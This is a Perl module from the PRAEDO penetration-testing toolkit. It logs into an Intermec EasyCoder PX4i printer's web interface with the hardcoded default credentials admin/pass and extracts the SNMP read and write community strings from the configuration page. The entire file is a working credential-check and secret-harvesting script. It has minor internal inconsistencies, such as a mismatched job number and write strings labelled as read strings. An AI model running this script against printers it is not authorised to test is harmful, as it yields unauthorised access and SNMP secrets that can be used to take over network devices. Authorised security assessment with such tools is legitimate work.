# Intermec EasyCoder PX4i  default password test and SNMP string extract
# 
######################################################
#                  PRAEDO Module #MA0010             #
#          Copyright (C) 2012 Foofus.net	     #
#              Deral Heiland    "percX"              # 
######################################################
package MA0010;
sub MA0010
{
 
# Set global variables
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


# Open output file and setup browser LWP function 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $LOGFILE.log \n");
print "\n**********Attempting to Verify default credentials on Intermec EasyCoder PX4i $TARGET : JOB MA0003**********\n";
print OUTFILE "\n**********Attempting to Verify default credentials on Intermec EasyCoder PX4i  $TARGET : JOB MA0003**********\n";

my $browser = LWP::UserAgent->new(timeout => 120);
$browser->default_header(Authorization=> "Basic YWRtaW46cGFzcw==");


# Test  For Default Password
     my $response = $browser->get("http$web://$TARGET:$PORTS/rom/secure/snmp.html",);

my $content = $response->content();
     
if ($content =~ /Configuration \[SNMP\]/)
        {
            print "Default Credentials : username=admin : password=pass\n";
           print OUTFILE "Default Credentials : username=admin : password=pass\n";

 my $html = HTML::TagParser->new($content);
 my @list = $html->getElementsByTagName( "input" );
    foreach my $elem ( @list )
  	{
         my $text1 = $elem->getAttribute("name");
         my $text2 = $elem->getAttribute("value");
                 if (($text1 =~ /.READ_COM/) || ($text1 =~ /.WRT_COM/))
                     {
                       print "SNMP Read community String = $text2\n";
                       print OUTFILE "SNMP Read community String = $text2\n";
                     }
                  else
                    {
                    }
        }

        }
        else 
        { 
           print "FAILED \n";
           print OUTFILE "FAILED \n";
        } 


# operation completed close out output files
close(OUTFILE);

}
		
1;
